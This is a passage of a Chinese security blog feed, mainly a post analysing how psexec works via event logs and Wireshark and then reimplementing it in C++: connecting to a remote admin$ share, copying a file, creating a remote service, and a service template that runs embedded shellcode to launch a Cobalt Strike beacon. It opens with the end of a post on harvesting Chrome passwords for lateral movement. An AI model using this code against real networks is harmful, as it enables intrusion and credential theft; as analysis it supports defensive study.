azColName[<span class="hljs-number">1</span>], argv[<span class="hljs-number">1</span>] ? argv[<span class="hljs-number">1</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">2</span>], Pass_Word);<br></code></pre></td></tr></table></figure><p>这里逻辑的话参照上面分析步骤,这里就不再赘述</p><p>最后看看解密效果<br><img src="/img/CatchChrome/25.png"></p><p><img src="/img/CatchChrome/26.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实战中如果拿到一台主机,并且安装有chrome,我们就可以抓取密码以便快速精确地横向。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参加某行动时通过psexec横向过几台主机,正好之前在网上看到很多大佬分析过这款工具,今天也自己动手重新分析一次<br>因为很大程度上是学着大佬分析思路来分析的,所以先把参考写在前面:<br><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p><img src="/img/psexec/1.png"></p><h2 id="Psexec原理分析"><a href="#Psexec原理分析" class="headerlink" title="Psexec原理分析"></a>Psexec原理分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>win10  ip：192.168.154.7</li><li>win server 2008  X64 192.168.154.31</li></ul><p>假设已经得到win10主机的system权限<br>在cs上通过psexec64来横向win2008</p><p><img src="/img/psexec/2.png"></p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机<br>可以看到win2008直接上线,并且是system权限</p><p><img src="/img/psexec/3.png"></p><p>看一下win2008的安全日志</p><p><img src="/img/psexec/4.png"></p><p>看到有多个安全日志的产生<br>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p><img src="/img/psexec/5.png"></p><p>采用的NTMLv2协议,所以即便不知道明文,有hash值就可以转递</p><p><img src="/img/psexec/6.png"></p><p>再看系统日志</p><p><img src="/img/psexec/7.png"></p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p><img src="/img/psexec/8.png"></p><p>猜想就是通过这个exe上线<br><img src="/img/psexec/9.png"></p><p>这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><ol><li><p>登陆远程主机   事件ID4624</p></li><li><p>连接admin$共享   事件ID7045</p></li><li><p>写入xxxx.exe文件到共享目录下也就是c:\windows下</p></li><li><p>执行xxxx.exe,随即上线</p></li></ol><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\PsExec.exe</span> <span class="hljs-string">\\192.168.154.31</span> -u administrator -p <span class="hljs-number">123456</span> cmd<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/10.png"></p><p><img src="/img/psexec/11.png"></p><p>设置过滤规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">src</span>==192.168.154.31 <span class="hljs-keyword">or</span> ip.<span class="hljs-attribute">dst</span>==192.168.154.31<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/12.png"></p><ol><li><p>先进行TCP三次握手</p></li><li><p>协商协议</p></li><li><p>进行NTML验证</p></li><li><p>尝试连接$IPC</p></li><li><p>尝试连接ADMIN$</p></li><li><p>尝试写入PSEXESVC.exe</p></li></ol><p><img src="/img/psexec/13.png"></p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p><img src="/img/psexec/14.png"></p><p>文件写入完毕后,执行API安装服务</p><p><img src="/img/psexec/15.png"></p><p>服务启动后会建立一个管道</p><p><img src="/img/psexec/16.png"></p><p>实际上一共创建了4个管道</p><p><img src="/img/psexec/17.png"></p><p><img src="/img/psexec/18.png"></p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><h2 id="实现psexec"><a href="#实现psexec" class="headerlink" title="实现psexec"></a>实现psexec</h2><h3 id="一-与目标主机建立SMB连接"><a href="#一-与目标主机建立SMB连接" class="headerlink" title="一.与目标主机建立SMB连接"></a>一.与目标主机建立SMB连接</h3><p>WNetAddConnection2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">WNetAddConnection2W</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPNETRESOURCEW lpNetResource,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpPassword,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR        lpUserName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD          dwFlags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">DWORD <span class="hljs-title">ConnectSMBServer</span><span class="hljs-params">(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 用于存放SMB共享资源格式</span><br>    PWCHAR lpwsIPC = <span class="hljs-keyword">new</span> WCHAR[MAX_PATH];<br>    DWORD dwRetVal; <span class="hljs-comment">// 函数返回值</span><br>    NETRESOURCE nr; <span class="hljs-comment">// 连接的详细信息</span><br>    DWORD dwFlags; <span class="hljs-comment">// 连接选项</span><br><br>    <span class="hljs-built_in">ZeroMemory</span>(&amp;nr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(NETRESOURCE));<br>    <span class="hljs-built_in">swprintf</span>(lpwsIPC, MAX_PATH, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\%s\admin$&quot;</span>), lpwsHost);<br>    nr.dwType = RESOURCETYPE_ANY; <span class="hljs-comment">// 枚举所有资源</span><br>    nr.lpLocalName = <span class="hljs-literal">NULL</span>;<br>    nr.lpRemoteName = lpwsIPC; <span class="hljs-comment">// 资源的网络名</span><br>    nr.lpProvider = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span><br>    dwFlags = CONNECT_UPDATE_PROFILE;<br>    dwRetVal = <span class="hljs-built_in">WNetAddConnection2</span>(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);<br>    <span class="hljs-keyword">if</span> (dwRetVal == NO_ERROR) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection added to %s\n&quot;</span>, nr.lpRemoteName);<br>        <span class="hljs-keyword">return</span> dwRetVal;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;WNetAddConnection2 failed with error: %d\n&quot;</span>, dwRetVal);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二-上传文件到目标主机"><a href="#二-上传文件到目标主机" class="headerlink" title="二.上传文件到目标主机"></a>二.上传文件到目标主机</h3><p>将现有文件拷贝到新文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CopyFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpExistingFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCTSTR lpNewFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  BOOL    bFailIfExists</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">UploadFileBySMB</span><span class="hljs-params">(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD dwRetVal;<br>    dwRetVal = <span class="hljs-built_in">CopyFile</span>(lpwsSrcPath, lpwsDstPath, FALSE);<br>    <span class="hljs-keyword">return</span> dwRetVal &gt; <span class="hljs-number">0</span> ? TRUE : FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三-开启服务"><a href="#三-开启服务" class="headerlink" title="三.开启服务"></a>三.开启服务</h3><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpMachineName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpDatabaseName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  dwDesiredAccess</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SC_HANDLE hSCManager,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDisplayName,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwDesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwServiceType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwStartType,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD     dwErrorControl,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpBinaryPathName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpLoadOrderGroup,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD   lpdwTagId,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpDependencies,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpServiceStartName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR   lpPassword</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>先使用<code>OpenSCManager</code>在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用<code>CreateService</code>创建一个服务,再通过<code>OpenService</code>,<code>StartService</code>打开并开启服务</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateServices</span><span class="hljs-params">(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Will Create Service %s\n&quot;</span> ,lpwsServiceName);<br>    SC_HANDLE hSCM;<br>    SC_HANDLE hService;<br>    SERVICE_STATUS ss;<br>    hSCM = <span class="hljs-built_in">OpenSCManager</span>(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);<br>    <span class="hljs-keyword">if</span> (hSCM == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenSCManager Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hService = <span class="hljs-built_in">CreateService</span>(<br>        hSCM, <span class="hljs-comment">// 服务控制管理器数据库的句柄</span><br>        lpwsServiceName, <span class="hljs-comment">// 要安装的服务的名称</span><br>        lpwsServiceName, <span class="hljs-comment">// 用户界面程序用来标识服务的显示名称</span><br>        GENERIC_ALL, <span class="hljs-comment">// 访问权限</span><br>        SERVICE_WIN32_OWN_PROCESS, <span class="hljs-comment">// 与一个或多个其他服务共享一个流程的服务</span><br>        SERVICE_DEMAND_START, <span class="hljs-comment">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span><br>        SERVICE_ERROR_IGNORE, <span class="hljs-comment">// 启动程序将忽略该错误并继续启动操作</span><br>        lpwsServicePath, <span class="hljs-comment">// 服务二进制文件的标准路径</span><br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateService Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Create Service Success : %s\n&quot;</span>,lpwsServicePath);<br>    hService = <span class="hljs-built_in">OpenService</span>(hSCM, lpwsServiceName, GENERIC_ALL);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Error: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Success: %d!\n&quot;</span>);<br>    <span class="hljs-built_in">StartService</span>(hService, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我生成一个cs的马,改名为sd</p><p><img src="/img/psexec/19.png"></p><p>win2008</p><p><img src="/img/psexec/20.png"></p><p>但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p><img src="/img/psexec/21.png"></p><p>打开系统日志查看</p><p><img src="/img/psexec/22.png"></p><p>我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><h2 id="编写服务程序"><a href="#编写服务程序" class="headerlink" title="编写服务程序"></a>编写服务程序</h2><h3 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h3><p>   几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。<br>    服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。<br>    SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</p><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋博客中也已经给出了一个编写windwos服务的模板<br>还有几篇介绍windows服务编写的:<br> <a href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p><img src="/img/psexec/23.png"></p><p>在模板上面加一点执行shellcode的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = shellcode<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span 